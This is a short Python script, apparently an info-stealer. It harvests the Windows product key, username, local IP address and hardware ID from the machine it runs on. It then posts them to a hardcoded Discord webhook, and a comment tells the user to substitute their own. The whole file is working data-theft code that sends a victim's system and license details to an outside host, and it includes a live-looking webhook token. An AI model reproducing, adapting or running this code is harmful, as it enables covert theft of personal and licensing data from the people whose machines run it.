import requests
import json
import subprocess
import socket


def get_local_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("google.com", 80))
    ip_address = s.getsockname()[0]
    s.close()
    return ip_address


def get_hwid():
    output = subprocess.check_output(["wmic", "csproduct", "get", "uuid"])
    output_str = output.decode("utf-8").strip()
    hwid = output_str.split("\n")[1].strip()
    return hwid


def main():
    # Get windows key
    output = subprocess.check_output(["wmic", "path", "softwarelicensingservice", "get", "OA3xOriginalProductKey"])
    output_str = output.decode("utf-8").strip()
    key = output_str.split("\n")[1].strip()
    # Get current users name
    username = subprocess.check_output(["whoami"]).decode("utf-8").strip()
    # Get ip Adress
    ip_address = get_local_ip_address()
    # Get HWID
    hwid = get_hwid()

    # REPLACE WEBHOOK_URL WITH YOUR OWN
    webhook_url = "https://discord.com/api/webhooks/1094464012575572041/mG-IicpdGrV5Bn02VFx1deeeB6KT66UnCBuSzaL9eZB10gLEpf_TPlIbNMocAUb0aEts"
    headers = {'Content-type': 'application/json'}
    payload = {
        "username": "Honesty",
        "avatar_url": "https://cdn.discordapp.com/attachments/1094476147888234506/1094476267396550807/3_-_a_letter_A_with_lines_with_a_smoke_backgroun.png",
        "embeds": [{
            "title": "Hello from Python!",
            "fields": [{
                "name": "Username",
                "value": "```{}```".format(username),
                "inline": True
            }, {
                "name": "IP Address",
                "value": "```{}```".format(ip_address),
                "inline": True
            }, {
                "name": "Windows Product Key",
                "value": "```{}```".format(key),
                "inline": True
            }, {
                "name": "HWID",
                "value": "```{}```".format(hwid),
                "inline": True
            }],
            "color": 15844367
        }]
    }

    res = requests.post(webhook_url, headers=headers, data=json.dumps(payload))
    res.raise_for_status()

if __name__ == "__main__":
    main()
